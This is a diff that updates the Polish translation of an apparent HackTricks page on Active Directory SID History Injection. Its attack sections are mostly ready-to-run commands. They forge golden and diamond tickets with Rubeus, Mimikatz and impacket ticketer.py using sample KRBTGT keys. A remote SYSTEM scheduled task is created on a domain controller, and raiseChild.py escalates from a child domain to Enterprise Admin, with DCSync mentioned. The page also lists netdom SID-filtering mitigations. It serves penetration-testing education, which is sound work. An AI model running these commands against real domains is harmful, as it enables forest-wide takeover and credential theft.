@@ -2,33 +2,33 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Atak wstrzykiwania historii SID
+## SID History Injection Attack
 
-Skupienie się na **ataku wstrzykiwania historii SID** polega na wspieraniu **migracji użytkowników między domenami**, zapewniając jednocześnie ciągły dostęp do zasobów z poprzedniej domeny. Osiąga się to poprzez **włączenie poprzedniego identyfikatora zabezpieczeń (SID) użytkownika do historii SID** jego nowe konto. Co ważne, proces ten można zmanipulować, aby przyznać nieautoryzowany dostęp, dodając SID grupy o wysokich uprawnieniach (takiej jak Enterprise Admins lub Domain Admins) z domeny macierzystej do historii SID. To wykorzystanie przyznaje dostęp do wszystkich zasobów w domenie macierzystej.
+Celem **SID History Injection Attack** jest ułatwienie **migracji użytkowników między domenami** przy jednoczesnym zachowaniu dostępu do zasobów z poprzedniej domeny. Osiąga się to poprzez **dodanie poprzedniego Security Identifier (SID) użytkownika do SID History** jego nowego konta. Warto zauważyć, że proces ten może zostać wykorzystany do przyznania nieautoryzowanego dostępu poprzez dodanie SID grupy o wysokich uprawnieniach (takiej jak Enterprise Admins lub Domain Admins) z domeny nadrzędnej do SID History. Takie wykorzystanie zapewnia dostęp do wszystkich zasobów w domenie nadrzędnej.<sup>[[1]](#references)[[2]](#references)</sup>
 
-Istnieją dwie metody wykonania tego ataku: poprzez stworzenie **Złotego Biletu** lub **Diamentowego Biletu**.
+Istnieją dwie metody przeprowadzenia tego ataku: poprzez utworzenie **Golden Ticket** albo **Diamond Ticket**.
 
-Aby zidentyfikować SID dla grupy **"Enterprise Admins"**, należy najpierw zlokalizować SID domeny głównej. Po identyfikacji, SID grupy Enterprise Admins można skonstruować, dodając `-519` do SID domeny głównej. Na przykład, jeśli SID domeny głównej to `S-1-5-21-280534878-1496970234-700767426`, to wynikowy SID dla grupy "Enterprise Admins" będzie `S-1-5-21-280534878-1496970234-700767426-519`.
+Aby ustalić SID grupy **"Enterprise Admins"**, należy najpierw znaleźć SID domeny głównej. Po jego zidentyfikowaniu można skonstruować SID grupy Enterprise Admins, dopisując `-519` do SID domeny głównej. Na przykład, jeśli SID domeny głównej to `S-1-5-21-280534878-1496970234-700767426`, wynikowy SID grupy "Enterprise Admins" będzie wynosił `S-1-5-21-280534878-1496970234-700767426-519`.<sup>[[1]](#references)</sup>
 
-Można również użyć grupy **Domain Admins**, której SID kończy się na **512**.
+Można również użyć grup **Domain Admins**, których SID kończy się wartością **512**.
 
 Innym sposobem na znalezienie SID grupy z innej domeny (na przykład "Domain Admins") jest:
 ```bash
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
 ```
 > [!WARNING]
-> Zauważ, że możliwe jest wyłączenie historii SID w relacji zaufania, co spowoduje niepowodzenie tego ataku.
+> Pamiętaj, że możliwe jest wyłączenie SID history w relacji zaufania, co spowoduje niepowodzenie tego ataku.
 
-Zgodnie z [**dokumentacją**](https://technet.microsoft.com/library/cc835085.aspx):
-- **Wyłączenie SIDHistory w zaufaniach lasów** za pomocą narzędzia netdom (`netdom trust /domain: /EnableSIDHistory:no na kontrolerze domeny`)
-- **Zastosowanie kwarantanny filtrów SID do zaufanych zewnętrznych** za pomocą narzędzia netdom (`netdom trust /domain: /quarantine:yes na kontrolerze domeny`)
-- **Zastosowanie filtrowania SID do zaufanych domen w obrębie jednego lasu** nie jest zalecane, ponieważ jest to nieobsługiwana konfiguracja i może powodować zmiany łamiące. Jeśli domena w lesie jest niegodna zaufania, nie powinna być członkiem lasu. W tej sytuacji konieczne jest najpierw podzielenie zaufanych i niegodnych zaufania domen na oddzielne lasy, gdzie można zastosować filtrowanie SID do zaufania między lasami.
+Zgodnie z [**dokumentacją**](https://technet.microsoft.com/library/cc835085.aspx):<sup>[[3]](#references)</sup>
+- **Wyłączenie SIDHistory w ramach forest trusts** za pomocą narzędzia netdom (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
+- **Zastosowanie SID Filter Quarantining do external trusts** za pomocą narzędzia netdom (`netdom trust /domain: /quarantine:yes on the domain controller`)
+- **Zastosowanie SID Filtering do domain trusts w ramach jednego lasu** nie jest zalecane, ponieważ jest to nieobsługiwana konfiguracja i może powodować breaking changes. Jeśli domena w lesie jest niezaufana, nie powinna być jego członkiem. W takiej sytuacji należy najpierw podzielić zaufane i niezaufane domeny na osobne lasy, w których można zastosować SID Filtering do interforest trust
 
-Sprawdź ten post, aby uzyskać więcej informacji na temat obejścia tego: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
+Więcej informacji o bypassing tego mechanizmu znajdziesz w tym poście: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
 
-### Bilet Diamentowy (Rubeus + KRBTGT-AES256)
+### Diamond Ticket (Rubeus + KRBTGT-AES256)
 
-Ostatnim razem, gdy to próbowałem, musiałem dodać argument **`/ldap`**.
+Ostatnim razem, gdy tego próbowałem, musiałem dodać argument **`/ldap`**.
 ```bash
 # Use the /sids param
 Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap
@@ -44,7 +44,7 @@ execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domai
 
 # You can use "Administrator" as username or any other string
 ```
-### Złoty Bilet (Mimikatz) z KRBTGT-AES256
+### Golden Ticket (Mimikatz) with KRBTGT-AES256
 ```bash
 mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"
 
@@ -61,7 +61,7 @@ mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid
 # The previous command will generate a file called ticket.kirbi
 # Just loading you can perform a dcsync attack agains the domain
 ```
-Aby uzyskać więcej informacji na temat złotych biletów, sprawdź:
+Więcej informacji o golden tickets znajdziesz tutaj:
 
 
 {{#ref}}
@@ -69,7 +69,7 @@ golden-ticket.md
 {{#endref}}
 
 
-Aby uzyskać więcej informacji na temat diamentowych biletów, sprawdź:
+Więcej informacji o diamond tickets znajdziesz tutaj:
 
 
 {{#ref}}
@@ -80,7 +80,7 @@ diamond-ticket.md
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
 ```
-Zwiększ uprawnienia do DA roota lub administratora przedsiębiorstwa, używając hasha KRBTGT skompromitowanej domeny:
+Eskaluj uprawnienia do DA domeny root lub Enterprise admin, używając hasha KRBTGT przejętej domeny:
 ```bash
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
 
@@ -92,15 +92,16 @@ schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTE
 
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
 ```
-Z uzyskanymi uprawnieniami z ataku możesz na przykład przeprowadzić atak DCSync w nowej domenie:
+Dzięki uzyskanym uprawnieniom w wyniku ataku możesz na przykład wykonać atak DCSync w nowej domenie:
+
 
 {{#ref}}
 dcsync.md
 {{#endref}}
 
-### Z linuxa
+### Z systemu Linux
 
-#### Ręcznie z [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
+#### Ręcznie za pomocą [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
 ```bash
 # This is for an attack from child to root domain
 # Get child domain SID
@@ -122,25 +123,26 @@ psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.1
 ```
 #### Automatycznie za pomocą [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
 
-To jest skrypt Impacket, który **automatyzuje eskalację z domeny podrzędnej do nadrzędnej**. Skrypt wymaga:
+Jest to skrypt Impacket, który **automatyzuje eskalację z domeny podrzędnej do nadrzędnej**. Skrypt wymaga:
 
-- Kontrolera domeny docelowej
-- Poświadczeń dla użytkownika administratora w domenie podrzędnej
+- Docelowego kontrolera domeny
+- Danych uwierzytelniających użytkownika administracyjnego w domenie podrzędnej
 
-Przebieg jest następujący:
+Przebieg:
 
-- Uzyskuje SID grupy Enterprise Admins w domenie nadrzędnej
+- Pobiera SID grupy Enterprise Admins z domeny nadrzędnej
 - Pobiera hash konta KRBTGT w domenie podrzędnej
-- Tworzy Złoty Bilet
+- Tworzy Golden Ticket
 - Loguje się do domeny nadrzędnej
-- Pobiera poświadczenia dla konta Administratora w domenie nadrzędnej
-- Jeśli określono przełącznik `target-exec`, uwierzytelnia się do Kontrolera Domeny domeny nadrzędnej za pomocą Psexec.
+- Pobiera dane uwierzytelniające konta Administrator w domenie nadrzędnej
+- Jeśli określono przełącznik `target-exec`, uwierzytelnia się do kontrolera domeny domeny nadrzędnej za pomocą Psexec.
 ```bash
 raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 ```
-## Odniesienia
+## Referencje
 
-- [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
-- [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
+- [1] [Sneaky Active Directory Persistence #14: SID History - adsecurity.org](https://adsecurity.org/?p=1772)
+- [2] [Czym jest Security Identifier (SID)? - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
+- [3] [Zagadnienia bezpieczeństwa dotyczące relacji zaufania - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)
 
 {{#include ../../banners/hacktricks-training.md}}
